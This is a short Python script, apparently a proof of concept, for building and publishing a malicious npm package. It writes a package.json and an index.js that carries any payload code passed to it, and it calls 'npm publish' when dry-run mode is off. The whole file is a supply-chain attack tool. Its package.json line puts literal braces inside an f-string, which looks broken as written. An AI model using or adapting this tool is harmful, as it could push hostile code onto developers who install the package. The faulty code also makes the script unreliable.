#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NPM Supply-Chain Injector (PoC)
"""
import os
import tempfile
import subprocess
from typing import Dict, Any

def inject_npm_package(package_name: str, payload_code: str = "console.log('pwned')", dryrun: bool = True) -> Dict[str, Any]:
    """
    PoC: Создаёт вредоносный npm-пакет и имитирует публикацию (npm publish). Если dryrun=True — только имитация.
    """
    result = {"status": "error", "details": ""}
    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            os.chdir(tmpdir)
            # Создаём package.json
            with open("package.json", "w") as f:
                f.write(f'{"name": "{package_name}", "version": "1.0.0", "main": "index.js", "description": "malicious PoC", "author": "evil", "license": "MIT"}')
            # Создаём index.js с payload
            with open("index.js", "w") as f:
                f.write(payload_code)
            # npm publish (dryrun)
            if dryrun:
                result["status"] = "dryrun"
                result["details"] = f"Malicious npm package {package_name} prepared (dryrun, not published)"
            else:
                out = subprocess.check_output(["npm", "publish"]).decode()
                result["status"] = "success"
                result["details"] = f"Published: {out}"
        except Exception as e:
            result["details"] = str(e)
    return result

if __name__ == "__main__":
    print(inject_npm_package("evil-poc-test", dryrun=True)) 